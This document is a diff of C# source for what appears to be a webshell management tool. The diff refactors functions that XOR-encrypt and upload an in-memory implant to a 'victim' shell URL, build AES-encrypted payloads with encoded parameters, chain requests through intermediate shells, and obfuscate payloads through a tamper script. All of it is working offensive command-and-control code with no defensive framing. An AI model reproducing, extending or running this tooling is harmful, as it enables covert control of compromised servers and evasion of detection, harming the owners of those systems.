@@ -7,13 +7,13 @@ using System.Reflection.Metadata;
 using System.Text;
 using System.Text.Json;
 using System.Threading.Tasks;
-
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Net;
 using System.Text.RegularExpressions;
 using System.Text.Json.Nodes;
 using System.Text.Json.Serialization;
+using System.Windows.Forms;
 
 namespace Alien
 {
@@ -857,99 +857,14 @@ namespace Alien
         public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
         public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
         {
-            string szSplitter = clsEzData.fnszGenerateRandomStr();
-
             if (m_victim.ShellPayloadType == enPayloadType.DarkMatter)
             {
                 // NebulaPulsar
 
-                for (int i = 0; i < asParams.Length; i++)
-                    asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
-
-                string szParams = string.Join("&", asParams);
-
-                try
-                {
-                    string szKey = m_victim.ShellPassword;
-                    string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
-                    //szHashKey = "NBPULSARDEADBEEF";
-                    //MessageBox.Show(szHashKey);
-                    byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
-
-                    if (!m_bInjectedNebularPulsar)
-                    {
-                        byte[]? abNebulaPulsar = fnGetNebulaPulsar();
-
-                        if (abNebulaPulsar == null)
-                            throw new Exception("NebulaPulsar is null or empty");
-
-
-                        byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);
-
-                        using (var content = new ByteArrayContent(abEncryptedImplant))
-                        {
-                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
-                            {
-                                CharSet = m_victim.ShellEncoding,
-                            };
-
-                            HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
-                            resp.EnsureSuccessStatusCode();
-                        }
-
-                        m_bInjectedNebularPulsar = true;
-                    }
-
-                    byte[]? abDarkMatter = fnGetDarkMatter(szPayloadName);
-
-                    if (abDarkMatter == null)
-                        throw new Exception("DarkMatter is null or empty");
-
-                    bool bVolatile = true;
-                    string szMode = bVolatile ? "volatile" : "persistent";
-                    string szParamStr = $"action=TEST&mode={szMode}&splitter={szSplitter}" + (string.IsNullOrEmpty(szParams) ? string.Empty : $"&{szParams}");
-                    byte[] abParamStr = Encoding.UTF8.GetBytes(szParamStr);
-
-                    int nLength = abDarkMatter.Length;
-                    byte[] abLength = BitConverter.GetBytes(nLength);
-                    if (BitConverter.IsLittleEndian)
-                        Array.Reverse(abLength);
-
-                    using (MemoryStream ms = new MemoryStream())
-                    {
-                        ms.Write(abLength, 0, abLength.Length);
-                        ms.Write(abDarkMatter, 0, abDarkMatter.Length);
-                        ms.Write(abParamStr, 0, abParamStr.Length);
-
-                        byte[] abRawPayload = ms.ToArray();
-                        byte[] abEncryptedPayload = clsCrypto.fnAesEncrypt(abRawPayload, abHashKey);
-                        
-                        using (var content = new ByteArrayContent(abEncryptedPayload))
-                        {
-                            content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
-                            {
-                                CharSet = m_victim.ShellEncoding,
-                            };
-
-                            HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
-                            resp.EnsureSuccessStatusCode();
-
-                            byte[] abEncResp = await resp.Content.ReadAsByteArrayAsync();
-                            byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);
-
-                            Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
-                            string szResp = encoding.GetString(abResp);
-
-                            return szResp;
-                        }
-                    }
-                }
-                catch (Exception ex)
-                {
-                    MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
-                    return string.Empty;
-                }
+                return await fnNebulaPulsar(szPayloadName, asParams);
             }
+
+            string szSplitter = clsEzData.fnszGenerateRandomStr();
 
             var config = m_victim.m_ShellConfig;
             string szPayload = await fnGetPayload(config, szPayloadName, szSplitter, asParams);
@@ -1036,73 +951,71 @@ namespace Alien
             return await fnHttpPOST(m_victim.m_ShellConfig, new Dictionary<stShellConfig, string>(), szPayload, szSplitter);
         }
 
-        /// <summary>
-        /// Read payload from file with specified language, method and payload type.
-        /// </summary>
-        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
-        /// <returns>Payload content</returns>
-        private async Task<string> fnGetPayload(stShellConfig config, string szPayloadName, string szSplitter, string[] asParams = null)
+        private async Task<string> fnNebulaPulsar(string szPayloadName, string[] asParams)
         {
-            string szSuffix = m_dicPayloadExtension[config.language];
-            string szPayloadFilePath = Path.Combine(new string[]
+            try
             {
-                "Payload",
-                config.language.ToString(),
-                config.szMethod,
-                config.payloadType.ToString(),
-                $"{szPayloadName}.{szSuffix}",
-            });
+                string szKey = m_victim.ShellPassword;
+                string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
+                byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
 
-            if (File.Exists(szPayloadFilePath))
-            {
-                string szPayload = File.ReadAllText(szPayloadFilePath);
-                foreach (string szPattern in m_dicRemoveSyntax[config.language])
+                if (!m_bInjectedNebularPulsar)
                 {
-                    if (string.IsNullOrEmpty(szPattern))
-                        continue;
+                    byte[]? abNebulaPulsar = fnGetNebulaPulsar();
 
-                    szPayload = szPayload.Replace(szPattern, string.Empty);
-                }
+                    if (abNebulaPulsar == null)
+                        throw new Exception("NebulaPulsar is null or empty");
 
+                    byte[] abEncryptedImplant = clsCrypto.fnXorEncrypt(abNebulaPulsar, abHashKey);
 
-                string szSplitFunc = m_dicSplitter[config.language].Replace("SPLITTER", szSplitter);
-                szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";
-
-                if (m_dicWrapper.ContainsKey(config.language))
-                {
-                    string szEncryptor = string.Empty;
-                    if (config.bEHEnable && !string.IsNullOrEmpty(config.szEventHorizonScript))
+                    using (var content = new ByteArrayContent(abEncryptedImplant))
                     {
-                        if (m_tamper == null)
-                            throw new Exception("Tamper object is null");
+                        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
+                        {
+                            CharSet = m_victim.ShellEncoding,
+                        };
 
-                        Dictionary<string, object>? dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
-                        if (dicParam == null)
-                            dicParam = new Dictionary<string, object>();
-
-                        dicParam["script"] = Enum.GetName(typeof(enLanguage), config.language);
-
-                        szEncryptor = await m_tamper.fnGetObfuscator(config.szEventHorizonScript, dicParam);
-                        if (string.IsNullOrEmpty(szEncryptor))
-                            szEncryptor = string.Empty;
-
-                        
+                        HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
+                        resp.EnsureSuccessStatusCode();
                     }
 
-                    string szMethod = config.szMethod;
-                    szPayload = m_dicWrapper[config.language](szMethod)(szPayload, szEncryptor);
-
-                    if (szPayloadName.Equals("eval"))
-                        asParams[0] = m_dicWrapper[config.language](szMethod)(asParams[0], "*");
+                    m_bInjectedNebularPulsar = true;
                 }
 
-                //MessageBox.Show(szPayload);
+                byte[]? abDarkMatter = fnGetDarkMatter(szPayloadName, asParams);
+                if (abDarkMatter == null)
+                    throw new Exception("DarkMatter is null or empty.");
 
-                return szPayload;
+                if (m_victim.m_ShellConfig.lsCometShellID.Count > 0)
+                {
+                    var lsConfig = m_victim.m_ShellConfig.lsCometShellID.Select(x => m_sqlConn.fnGetShellConfig(x)).ToList();
+                    lsConfig.Reverse();
+
+                    var result = await fnDriftingComet(lsConfig, Convert.ToBase64String(abDarkMatter));
+                }
+
+                using (var content = new ByteArrayContent(abDarkMatter))
+                {
+                    content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream")
+                    {
+                        CharSet = m_victim.ShellEncoding,
+                    };
+
+                    HttpResponseMessage resp = await m_clnt.PostAsync(m_victim.ShellURL, content);
+                    resp.EnsureSuccessStatusCode();
+
+                    byte[] abEncResp = await resp.Content.ReadAsByteArrayAsync();
+                    byte[] abResp = clsCrypto.fnAesDecrypt(abEncResp, abHashKey);
+
+                    Encoding encoding = Encoding.GetEncoding(m_victim.ShellEncoding);
+                    string szResp = encoding.GetString(abResp);
+
+                    return szResp;
+                }
             }
-            else
+            catch (Exception ex)
             {
-                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return string.Empty;
             }
         }
@@ -1112,7 +1025,7 @@ namespace Alien
             if (string.IsNullOrEmpty(szPayload))
                 throw new Exception("Payload is null or empty");
 
-            string szCurrentPayload = szPayload;
+            string? szCurrentPayload = szPayload;
 
             stShellConfig finalTargetConfig = new stShellConfig();
             string szFinalURL = string.Empty;
@@ -1124,19 +1037,7 @@ namespace Alien
                 string szPassword = config.szPassword;
 
                 string szNextUrl = i == 0 ? m_victim.ShellURL : lsConfig[i - 1].szUrl;
-
-                if (config.payloadType == enPayloadType.DarkMatter)
-                {
-                    // NebulaPulsar
-
-                    byte[]? abTemplate = fnGetDarkMatter("comet");
-                    if (abTemplate == null)
-                        throw new Exception("Comet payload is null or empty.");
-
-
-
-                    continue;
-                }
+                var nextConfig = i == 0 ? m_victim.m_ShellConfig : lsConfig[i - 1];
 
                 string szSplitter = clsEzData.fnszGenerateRandomStr();
                 string szCurrentTemplate = await fnGetPayload(config, "comet", szSplitter);
@@ -1190,6 +1091,76 @@ namespace Alien
             return (finalTargetConfig, szFinalURL, szCurrentPayload, lsSplitter);
         }
 
+        /// <summary>
+        /// Read payload from file with specified language, method and payload type.
+        /// </summary>
+        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
+        /// <returns>Payload content</returns>
+        private async Task<string> fnGetPayload(stShellConfig config, string szPayloadName, string szSplitter, string[] asParams = null)
+        {
+            string szSuffix = m_dicPayloadExtension[config.language];
+            string szPayloadFilePath = Path.Combine(new string[]
+            {
+                "Payload",
+                config.language.ToString(),
+                config.szMethod,
+                config.payloadType.ToString(),
+                $"{szPayloadName}.{szSuffix}",
+            });
+
+            if (File.Exists(szPayloadFilePath))
+            {
+                string szPayload = File.ReadAllText(szPayloadFilePath);
+                foreach (string szPattern in m_dicRemoveSyntax[config.language])
+                {
+                    if (string.IsNullOrEmpty(szPattern))
+                        continue;
+
+                    szPayload = szPayload.Replace(szPattern, string.Empty);
+                }
+
+                string szSplitFunc = m_dicSplitter[config.language].Replace("SPLITTER", szSplitter);
+                szPayload = $"{szSplitFunc}\r\n{szPayload}\r\n{szSplitFunc}";
+
+                if (m_dicWrapper.ContainsKey(config.language))
+                {
+                    string szEncryptor = string.Empty;
+                    if (config.bEHEnable && !string.IsNullOrEmpty(config.szEventHorizonScript))
+                    {
+                        if (m_tamper == null)
+                            throw new Exception("Tamper object is null");
+
+                        Dictionary<string, object>? dicParam = JsonSerializer.Deserialize<Dictionary<string, object>>(config.szEventHorizonConfig);
+                        if (dicParam == null)
+                            dicParam = new Dictionary<string, object>();
+
+                        dicParam["script"] = Enum.GetName(typeof(enLanguage), config.language);
+
+                        szEncryptor = await m_tamper.fnGetObfuscator(config.szEventHorizonScript, dicParam);
+                        if (string.IsNullOrEmpty(szEncryptor))
+                            szEncryptor = string.Empty;
+
+                        
+                    }
+
+                    string szMethod = config.szMethod;
+                    szPayload = m_dicWrapper[config.language](szMethod)(szPayload, szEncryptor);
+
+                    if (szPayloadName.Equals("eval"))
+                        asParams[0] = m_dicWrapper[config.language](szMethod)(asParams[0], "*");
+                }
+
+                //MessageBox.Show(szPayload);
+
+                return szPayload;
+            }
+            else
+            {
+                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return string.Empty;
+            }
+        }
+
         private byte[]? fnGetNebulaPulsar()
         {
             string? szLang = Enum.GetName(typeof(enLanguage), m_victim.ShellLanguage);
@@ -1222,6 +1193,49 @@ namespace Alien
                 throw new Exception("File not found: " + szPath);
 
             return File.ReadAllBytes(szPath);
+        }
+
+        private byte[]? fnGetDarkMatter(string szName, string[] asParams)
+        {
+            return fnGetDarkMatter(m_victim.m_ShellConfig, szName, asParams);
+        }
+
+        private byte[] fnGetDarkMatter(stShellConfig config, string szName, string[] asParams)
+        {
+            for (int i = 0; i < asParams.Length; i++)
+                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";
+
+            string szParams = string.Join("&", asParams);
+
+            byte[]? abDarkMatter = fnGetDarkMatter(szName);
+            if (abDarkMatter == null)
+                throw new Exception("DarkMatter is null or empty.");
+
+            bool bVolatile = true;
+            string szMode = bVolatile ? "volatile" : "persistent";
+            string szParamStr = $"action=TEST&mode={szMode}&splitter={clsEzData.fnszGenerateRandomStr()}" + (string.IsNullOrEmpty(szParams) ? string.Empty : $"&{szParams}");
+            byte[] abParamStr = Encoding.UTF8.GetBytes(szParamStr);
+
+            int nLength = abDarkMatter.Length;
+            byte[] abLength = BitConverter.GetBytes(nLength);
+            if (BitConverter.IsLittleEndian)
+                Array.Reverse(abLength);
+
+            string szKey = config.szPassword;
+            string szHashKey = clsCrypto.fnGetMD5Last16(szKey);
+            byte[] abHashKey = Encoding.UTF8.GetBytes(szHashKey);
+
+            using (MemoryStream ms = new MemoryStream())
+            {
+                ms.Write(abLength, 0, abLength.Length);
+                ms.Write(abDarkMatter, 0, abDarkMatter.Length);
+                ms.Write(abParamStr, 0, abParamStr.Length);
+
+                byte[] abRawPayload = ms.ToArray();
+                byte[] abEncryptedPayload = clsCrypto.fnAesEncrypt(abRawPayload, abHashKey);
+
+                return abEncryptedPayload;
+            }
         }
 
         private async Task<bool> fnUnloadNebulaPulsar()
